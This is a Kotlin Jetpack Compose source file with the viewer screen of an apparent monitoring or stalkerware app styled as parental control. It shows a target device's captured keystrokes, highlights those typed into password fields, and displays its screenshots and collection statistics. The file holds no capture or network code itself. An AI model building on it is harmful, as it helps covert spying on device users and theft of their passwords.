package com.divine.specter.parent.ui

import android.graphics.BitmapFactory
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.grid.GridCells
import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
import androidx.compose.foundation.lazy.grid.items
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun SurveillanceScreen(
    deviceId: String,
    deviceName: String,
    filesDir: File,
    onBack: () -> Unit
) {
    var selectedTab by remember { mutableStateOf(0) }
    val tabs = listOf("Keystrokes", "Screenshots", "Stats")

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("Surveillance: $deviceName") },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.Default.ArrowBack, "Back")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = Color(0xFF1A1A1A),
                    titleContentColor = Color.White,
                    navigationIconContentColor = Color.White
                )
            )
        }
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .background(Color(0xFF0F0F0F))
        ) {
            // Tabs
            TabRow(
                selectedTabIndex = selectedTab,
                containerColor = Color(0xFF1A1A1A),
                contentColor = Color(0xFF00FF88)
            ) {
                tabs.forEachIndexed { index, title ->
                    Tab(
                        selected = selectedTab == index,
                        onClick = { selectedTab = index },
                        text = { Text(title) }
                    )
                }
            }

            // Content
            when (selectedTab) {
                0 -> KeystrokesView(deviceId, filesDir)
                1 -> ScreenshotsView(deviceId, filesDir)
                2 -> StatsView(deviceId, filesDir)
            }
        }
    }
}

@Composable
fun KeystrokesView(deviceId: String, filesDir: File) {
    val keystrokeFile = File(filesDir, "keystrokes_$deviceId.log")
    val keystrokes = remember {
        mutableStateListOf<KeystrokeEntry>().apply {
            if (keystrokeFile.exists()) {
                val lines = keystrokeFile.readLines()
                for (line in lines) {
                    if (line.startsWith("[") && line.contains("]")) {
                        try {
                            val timestamp = line.substring(1, line.indexOf("]")).toLong()
                            val rest = line.substring(line.indexOf("]") + 2)
                            val parts = rest.split(":")
                            if (parts.size >= 2) {
                                val pkgAndType = parts[0].trim()
                                val text = parts.drop(1).joinToString(":").trim()
                                add(KeystrokeEntry(timestamp, pkgAndType, text))
                            }
                        } catch (e: Exception) { }
                    }
                }
            }
        }
    }

    if (keystrokes.isEmpty()) {
        Box(
            modifier = Modifier.fillMaxSize(),
            contentAlignment = Alignment.Center
        ) {
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                Icon(
                    Icons.Default.Keyboard,
                    contentDescription = null,
                    modifier = Modifier.size(64.dp),
                    tint = Color.Gray
                )
                Spacer(Modifier.height(16.dp))
                Text("No keystrokes captured", color = Color.Gray)
            }
        }
    } else {
        LazyColumn(
            modifier = Modifier
                .fillMaxSize()
                .padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(8.dp)
        ) {
            items(keystrokes.reversed()) { entry ->
                KeystrokeCard(entry)
            }
        }
    }
}

data class KeystrokeEntry(
    val timestamp: Long,
    val packageInfo: String,
    val text: String
)

@Composable
fun KeystrokeCard(entry: KeystrokeEntry) {
    val dateFormat = SimpleDateFormat("MMM dd, HH:mm:ss", Locale.getDefault())
    val isPassword = entry.packageInfo.contains("password", ignoreCase = true)

    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(
            containerColor = Color(0xFF1A1A1A)
        ),
        shape = RoundedCornerShape(8.dp)
    ) {
        Column(modifier = Modifier.padding(12.dp)) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Text(
                    entry.packageInfo,
                    fontSize = 12.sp,
                    color = Color(0xFF00FF88),
                    fontFamily = FontFamily.Monospace
                )
                Text(
                    dateFormat.format(Date(entry.timestamp)),
                    fontSize = 11.sp,
                    color = Color.Gray
                )
            }
            Spacer(Modifier.height(4.dp))
            Text(
                entry.text,
                color = if (isPassword) Color(0xFFFF4444) else Color.White,
                fontFamily = FontFamily.Monospace,
                fontSize = 14.sp
            )
        }
    }
}

@Composable
fun ScreenshotsView(deviceId: String, filesDir: File) {
    val screenshotDir = File(filesDir, "screenshots_$deviceId")
    val screenshots = remember {
        mutableStateListOf<File>().apply {
            if (screenshotDir.exists()) {
                screenshotDir.listFiles()
                    ?.filter { it.extension == "jpg" }
                    ?.sortedByDescending { it.lastModified() }
                    ?.let { addAll(it) }
            }
        }
    }

    var selectedScreenshot by remember { mutableStateOf<File?>(null) }

    if (screenshots.isEmpty()) {
        Box(
            modifier = Modifier.fillMaxSize(),
            contentAlignment = Alignment.Center
        ) {
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                Icon(
                    Icons.Default.Screenshot,
                    contentDescription = null,
                    modifier = Modifier.size(64.dp),
                    tint = Color.Gray
                )
                Spacer(Modifier.height(16.dp))
                Text("No screenshots captured", color = Color.Gray)
            }
        }
    } else {
        LazyVerticalGrid(
            columns = GridCells.Fixed(2),
            modifier = Modifier
                .fillMaxSize()
                .padding(16.dp),
            horizontalArrangement = Arrangement.spacedBy(12.dp),
            verticalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            items(screenshots) { file ->
                ScreenshotThumbnail(file) { selectedScreenshot = it }
            }
        }
    }

    // Full-screen screenshot dialog
    selectedScreenshot?.let { file ->
        ScreenshotDialog(file) { selectedScreenshot = null }
    }
}

@Composable
fun ScreenshotThumbnail(file: File, onClick: (File) -> Unit) {
    val dateFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
    val timestamp = file.nameWithoutExtension.removePrefix("screenshot_").toLongOrNull() ?: 0L

    Card(
        modifier = Modifier
            .aspectRatio(9f / 16f)
            .clickable { onClick(file) },
        colors = CardDefaults.cardColors(
            containerColor = Color(0xFF1A1A1A)
        )
    ) {
        Box(modifier = Modifier.fillMaxSize()) {
            val bitmap = remember(file) {
                BitmapFactory.decodeFile(file.absolutePath)
            }
            if (bitmap != null) {
                Image(
                    bitmap = bitmap.asImageBitmap(),
                    contentDescription = null,
                    modifier = Modifier.fillMaxSize()
                )
            }

            // Timestamp overlay
            Text(
                dateFormat.format(Date(timestamp)),
                modifier = Modifier
                    .align(Alignment.BottomEnd)
                    .background(Color.Black.copy(alpha = 0.7f))
                    .padding(4.dp),
                color = Color.White,
                fontSize = 10.sp,
                fontFamily = FontFamily.Monospace
            )
        }
    }
}

@Composable
fun ScreenshotDialog(file: File, onDismiss: () -> Unit) {
    Dialog(onDismissRequest = onDismiss) {
        Box(
            modifier = Modifier
                .fillMaxSize()
                .clickable { onDismiss() }
                .background(Color.Black.copy(alpha = 0.95f)),
            contentAlignment = Alignment.Center
        ) {
            val bitmap = remember(file) {
                BitmapFactory.decodeFile(file.absolutePath)
            }
            if (bitmap != null) {
                Image(
                    bitmap = bitmap.asImageBitmap(),
                    contentDescription = null,
                    modifier = Modifier.fillMaxWidth(0.95f)
                )
            }
        }
    }
}

@Composable
fun StatsView(deviceId: String, filesDir: File) {
    val keystrokeFile = File(filesDir, "keystrokes_$deviceId.log")
    val screenshotDir = File(filesDir, "screenshots_$deviceId")

    val keystrokeCount = remember {
        keystrokeFile.takeIf { it.exists() }?.readLines()?.count { it.startsWith("[") } ?: 0
    }

    val screenshotCount = remember {
        screenshotDir.takeIf { it.exists() }?.listFiles()?.size ?: 0
    }

    val totalDataSize = remember {
        val keystrokeSize = keystrokeFile.takeIf { it.exists() }?.length() ?: 0L
        val screenshotSize = screenshotDir.takeIf { it.exists() }?.listFiles()
            ?.sumOf { it.length() } ?: 0L
        (keystrokeSize + screenshotSize) / 1024 / 1024 // MB
    }

    LazyColumn(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        item {
            StatCard(
                icon = Icons.Default.Keyboard,
                title = "Keystrokes Captured",
                value = keystrokeCount.toString(),
                color = Color(0xFF00FF88)
            )
        }
        item {
            StatCard(
                icon = Icons.Default.Screenshot,
                title = "Screenshots Taken",
                value = screenshotCount.toString(),
                color = Color(0xFF00CCFF)
            )
        }
        item {
            StatCard(
                icon = Icons.Default.Storage,
                title = "Total Data Collected",
                value = "$totalDataSize MB",
                color = Color(0xFFFF8800)
            )
        }
    }
}

@Composable
fun StatCard(
    icon: androidx.compose.ui.graphics.vector.ImageVector,
    title: String,
    value: String,
    color: Color
) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(
            containerColor = Color(0xFF1A1A1A)
        ),
        shape = RoundedCornerShape(12.dp)
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(20.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(
                icon,
                contentDescription = null,
                modifier = Modifier.size(48.dp),
                tint = color
            )
            Spacer(Modifier.width(16.dp))
            Column {
                Text(
                    title,
                    fontSize = 14.sp,
                    color = Color.Gray
                )
                Text(
                    value,
                    fontSize = 28.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color.White
                )
            }
        }
    }
}
